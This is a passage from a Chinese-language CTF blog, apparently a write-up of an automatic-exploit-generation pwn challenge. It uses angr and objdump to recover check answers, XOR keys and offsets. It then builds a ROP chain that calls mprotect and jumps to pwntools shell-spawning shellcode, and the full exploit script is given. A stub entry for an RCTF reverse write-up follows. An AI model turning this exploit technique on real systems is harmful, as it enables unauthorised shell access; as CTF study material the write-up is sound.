sm.found and not sm.found[0].solver.constraints:</span><br><span class="line">			ans+=chr(i+48);</span><br><span class="line">			break;</span><br><span class="line">	target_func_addr = func.get_call_target(target_block_addr);</span><br></pre></td></tr></table></figure></p>
<p>第三类check是与一常量进行，比较，且该常量位于rodata段上，因此我们只需要将它取出来就是，可以发现的是，该常量在rodata段的偏移为8或者8+5,这取决于是否有干扰的字符串test产生，特判一下就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const_addr = proj.loader.main_object.sections_map[&apos;.rodata&apos;].min_addr+8;</span><br><span class="line">const = state.solver.eval( state.memory.load(const_addr,8)  , cast_to=str  );</span><br><span class="line">if &apos;test&apos; in const:</span><br><span class="line">	const = state.solver.eval( state.memory.load(const_addr+5,8)  , cast_to=str  );</span><br></pre></td></tr></table></figure></p>
<p>通过执行shell命令，利用objdump来获取xor的两个常量，和dest相对rbp的偏移<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;xor    eax,&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">xor2 = int(a[0][-10:],16)&amp;0xff;</span><br><span class="line">xor1 = int(a[1][-10:],16)&amp;0xff;</span><br><span class="line">print hex(xor1),hex(xor2);</span><br><span class="line">a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;lea    rax,\[rbp&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">offset = int(a[0][-5:-1],16);</span><br><span class="line">print hex(offset);</span><br></pre></td></tr></table></figure></p>
<h2 id="Rop链的生成"><a href="#Rop链的生成" class="headerlink" title="Rop链的生成"></a>Rop链的生成</h2><p>ROPgadgets了一下，发现该程序中没有比较好的gadgets可以利用，但是大家可以注意到，在main函数开始的地方，调用了一个什么都没做的函数，但是如果我们打开它的反汇编窗口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000036715D5 48 8B 7D C0                   mov     rdi, [rbp+var_40]</span><br><span class="line">.text:00000000036715D9 48 8B 4D C8                   mov     rcx, [rbp+var_38]</span><br><span class="line">.text:00000000036715DD 48 8B 55 E0                   mov     rdx, [rbp+var_20]</span><br><span class="line">.text:00000000036715E1 48 8B 75 D8                   mov     rsi, [rbp+var_28]</span><br><span class="line">.text:00000000036715E5 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:00000000036715E9 4D 89 C1                      mov     r9, r8</span><br><span class="line">.text:00000000036715EC 49 89 F8                      mov     r8, rdi</span><br><span class="line">.text:00000000036715EF 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:00000000036715F2 E8 97 FF FF FF                call    sub_367158E</span><br><span class="line">.text:00000000036715F7 89 45 FC                      mov     [rbp+var_4], eax</span><br><span class="line">.text:00000000036715FA 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000036715FD C9                            leave</span><br><span class="line">.text:00000000036715FE C3</span><br></pre></td></tr></table></figure></p>
<p>可以发现如果rbp可控，那么我们就可以利用这段代码来控制寄存器，因此利用思路为，构造rop链执行mprotect修改payload所在地址为可执行，然后跳转到payload上getshell<br>payload所在地址相对于.bss段结尾的偏移是固定的，因此利用angr和objdump获取该gadgets的地址和payload的地址，而且我们利用的这段gadgets里，用来操控的地址相对rbp的偏移也是不一样的…也需要用objdump来获取一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = proj.loader.main_object.sections_map[&apos;.bss&apos;].max_addr-999;</span><br><span class="line"></span><br><span class="line">a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;mov    rdx&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">rop_chain_addr = int(a[1][1:(a[1].index(&apos;:&apos;))],16);</span><br><span class="line">print hex(rop_chain_addr);</span><br><span class="line"></span><br><span class="line">a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;mov    rsi&apos; &quot;).split(&apos;\n&apos;)</span><br><span class="line">offset2 = int( a[1][-5:-1], 16);</span><br></pre></td></tr></table></figure>
<p>生成rop链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rdi = (payload_addr)-(payload_addr)%0x4000;</span><br><span class="line">rsi = 0x4000;</span><br><span class="line">rdx = 0x1 | 0x2 | 0x4;</span><br><span class="line">payload+= const.ljust(offset,&apos;a&apos;);</span><br><span class="line">payload+= p64( payload_addr+len(payload)+8+8+offset2 );</span><br><span class="line">payload+= p64(rop_chain_addr);</span><br><span class="line"># payload+= &apos;a&apos;*8;</span><br><span class="line">shellcode = asm( shellcraft.amd64.sh() );</span><br><span class="line">payload+= p64(rsi);</span><br><span class="line">payload+= p64(rdx);</span><br><span class="line">payload+= p64(rdi);</span><br><span class="line">payload+= &apos;a&apos;*(offset2-0x18);</span><br><span class="line">payload+= &apos;a&apos;*0x8;</span><br><span class="line">payload+= p64(proj.loader.main_object.plt[&apos;mprotect&apos;]);</span><br><span class="line">payload+= p64(payload_addr+len(payload)+8);</span><br><span class="line">print &apos;shellcode_offset:&apos;,len(payload);</span><br><span class="line">payload+= shellcode;</span><br><span class="line">payload=get(payload,xor1,xor2);</span><br></pre></td></tr></table></figure></p>
<p>完整代码如下，由于第二部分check需要爆破，因此需要多次尝试才能在规定时间内求解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">import angr;</span><br><span class="line">import claripy;</span><br><span class="line">import os;</span><br><span class="line">import commands</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">s = lambda data : p.send(data);</span><br><span class="line">sl = lambda data : p.sendline(data);</span><br><span class="line">sla = lambda st,data : p.sendlineafter(st,data);</span><br><span class="line">sa = lambda st,data : p.sendafter(st,data);</span><br><span class="line">ru = lambda st,drop=False : p.recvuntil(st,drop=drop,timeout=4096);</span><br><span class="line">r = lambda : p.recv();</span><br><span class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;;</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;;</span><br><span class="line">proj = angr.Project(&quot;1.elf&quot;,auto_load_libs=True);</span><br><span class="line">def get(a,xor1,xor2):</span><br><span class="line">	a = list(a);</span><br><span class="line">	for i in range( len(a) ):</span><br><span class="line">		if i%2==1:</span><br><span class="line">			a[i]=chr( ord(a[i])^xor1 );</span><br><span class="line">		if i%2==0:</span><br><span class="line">			a[i]=chr( ord(a[i])^xor2 );</span><br><span class="line">	return &apos;&apos;.join( [i for i in a] ).encode(&apos;hex&apos;);</span><br><span class="line"></span><br><span class="line">def generate_rop():</span><br><span class="line">	global payload;</span><br><span class="line">	state = proj.factory.blank_state();</span><br><span class="line">	payload_addr = proj.loader.main_object.sections_map[&apos;.bss&apos;].max_addr-999;</span><br><span class="line">	print &apos;payload_addr&apos;,hex(payload_addr);</span><br><span class="line">	const_addr = proj.loader.main_object.sections_map[&apos;.rodata&apos;].min_addr+8;</span><br><span class="line">	const = state.solver.eval( state.memory.load(const_addr,8)  , cast_to=str  );</span><br><span class="line">	if &apos;test&apos; in const:</span><br><span class="line">		const = state.solver.eval( state.memory.load(const_addr+5,8)  , cast_to=str  );</span><br><span class="line">	print &apos;get_const:&apos;,const; </span><br><span class="line">	# get offset</span><br><span class="line">	a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;xor    eax,&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">	print a;</span><br><span class="line">	xor2 = int(a[0][  a[0].index(&apos;,&apos;)+1: ],16)&amp;0xff;</span><br><span class="line">	xor1 = int(a[1][  a[1].index(&apos;,&apos;)+1: ],16)&amp;0xff;</span><br><span class="line">	print hex(xor1),hex(xor2);</span><br><span class="line">	a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;lea    rax,\[rbp&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line"></span><br><span class="line">	offset = int(a[0][-5:-1],16);</span><br><span class="line">	print hex(offset);</span><br><span class="line">	a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;mov    rdx&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">	rop_chain_addr = int(a[1][1:(a[1].index(&apos;:&apos;))],16);</span><br><span class="line">	print hex(rop_chain_addr);</span><br><span class="line">	print hex(offset);</span><br><span class="line">	a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;mov    rsi&apos; &quot;).split(&apos;\n&apos;)</span><br><span class="line">	offset2 = int( a[1][-5:-1], 16);</span><br><span class="line">	rdi = (payload_addr)-(payload_addr)%0x4000;</span><br><span class="line">	rsi = 0x4000;</span><br><span class="line">	rdx = 0x1 | 0x2 | 0x4;</span><br><span class="line">	payload+= const.ljust(offset,&apos;a&apos;);</span><br><span class="line">	payload+= p64( payload_addr+len(payload)+8+8+offset2 );</span><br><span class="line">	payload+= p64(rop_chain_addr);</span><br><span class="line">	# payload+= &apos;a&apos;*8;</span><br><span class="line">	shellcode = asm( shellcraft.amd64.sh() );</span><br><span class="line">	payload+= p64(rsi);</span><br><span class="line">	payload+= p64(rdx);</span><br><span class="line">	payload+= p64(rdi);</span><br><span class="line">	payload+= &apos;a&apos;*(offset2-0x18);</span><br><span class="line">	payload+= &apos;a&apos;*0x8;</span><br><span class="line">	payload+= p64(proj.loader.main_object.plt[&apos;mprotect&apos;]);</span><br><span class="line">	payload+= p64(payload_addr+len(payload)+8);</span><br><span class="line">	print &apos;shellcode_offset:&apos;,len(payload);</span><br><span class="line">	payload+= shellcode;</span><br><span class="line">	payload=get(payload,xor1,xor2);</span><br><span class="line"></span><br><span class="line">def get_ans():</span><br><span class="line">	global payload;</span><br><span class="line">	cfg = proj.analyses.CFGFast(regions=[(proj.entry, proj.loader.main_object.max_addr)], force_complete_scan=False);</span><br><span class="line">	state = proj.factory.full_init_state();</span><br><span class="line">	sm = proj.factory.simulation_manager(state);</span><br><span class="line">	sm.explore( find=proj.entry+0x24 ).move(&apos;found&apos;,&apos;active&apos;);</span><br><span class="line">	main_addr = sm.one_active.solver.eval( sm.one_active.regs.rdi );</span><br><span class="line">	# print &apos;main_addr:&apos;,hex(main_addr);</span><br><span class="line">	main_func = cfg.functions.function(main_addr);</span><br><span class="line">	# print sorted(main_func.get_call_sites());</span><br><span class="line">	block_addr = sorted(main_func.get_call_sites())[-2];</span><br><span class="line">	cur_func_addr = main_func.get_call_target(block_addr);</span><br><span class="line">	# print hex(target_func_addr);</span><br><span class="line">	print proj.loader.main_object.plt[&apos;mprotect&apos;]</span><br><span class="line">	print proj.loader.main_object.sections_map[&apos;.rodata&apos;].max_addr; </span><br><span class="line">	print type(proj.loader.main_object.sections_map[&apos;.bss&apos;]);</span><br><span class="line">	ans = &quot;&quot;;</span><br><span class="line">	while len(ans)!=48:</span><br><span class="line">		a = claripy.BVS(&apos;x&apos;, 8);</span><br><span class="line">		b = claripy.BVS(&apos;y&apos;, 8);</span><br><span class="line">		c = claripy.BVS(&apos;z&apos;, 8);</span><br><span class="line"></span><br><span class="line">		func = cfg.functions.function(cur_func_addr);</span><br><span class="line">		</span><br><span class="line">		state = proj.factory.call_state(cur_func_addr,a,b,c);</span><br><span class="line">		</span><br><span class="line">		sm = proj.factory.simulation_manager(state);</span><br><span class="line">		target_block_addr = func.get_call_sites()[0];</span><br><span class="line">		# print &apos;target_block_addr&apos;,hex(target_block_addr);</span><br><span class="line">		# print func.get_call_sites();</span><br><span class="line">		</span><br><span class="line">		sm.explore( find=target_block_addr );</span><br><span class="line">		ans+=chr( sm.found[0].solver.eval(a) );</span><br><span class="line">		ans+=chr( sm.found[0].solver.eval(b) );</span><br><span class="line">		ans+=chr( sm.found[0].solver.eval(c) );</span><br><span class="line">		cur_func_addr = func.get_call_target(target_block_addr);</span><br><span class="line">	while len(ans)!=51:</span><br><span class="line">		</span><br><span class="line">		func = cfg.functions.function(cur_func_addr);</span><br><span class="line">		target_block_addr = func.get_call_sites()[0];</span><br><span class="line">		</span><br><span class="line">		for i in range(64):</span><br><span class="line">			state = proj.factory.call_state(cur_func_addr,i+48);</span><br><span class="line">			sm = proj.factory.simulation_manager(state);</span><br><span class="line">			sm.explore( find=target_block_addr );</span><br><span class="line">			if sm.found and not sm.found[0].solver.constraints:</span><br><span class="line">				ans+=chr(i+48);</span><br><span class="line">				break;</span><br><span class="line">		cur_func_addr = func.get_call_target(target_block_addr);</span><br><span class="line">	payload+=ans;</span><br><span class="line">get_ans();</span><br><span class="line">generate_rop();</span><br><span class="line"># print os.popen();</span><br><span class="line">print payload;</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-RCTF-Reverse-wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/05/20/RCTF-Reverse-wp/" class="article-date">
      <time datetime="2019-05-20T13:31:06.000Z" itemprop="datePublished">2019-05-20</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/20/RCTF-Reverse-wp/">RCTF Reverse wp</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
              <h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1>
          
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
        <p class="article-more-link">
          <a href="/2019/05/20/RCTF-Reverse-wp/#more">more >></a>
        </p>
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2019-2020 lxf
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
             title: "a.article-title, .article-more-link a", 
            
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>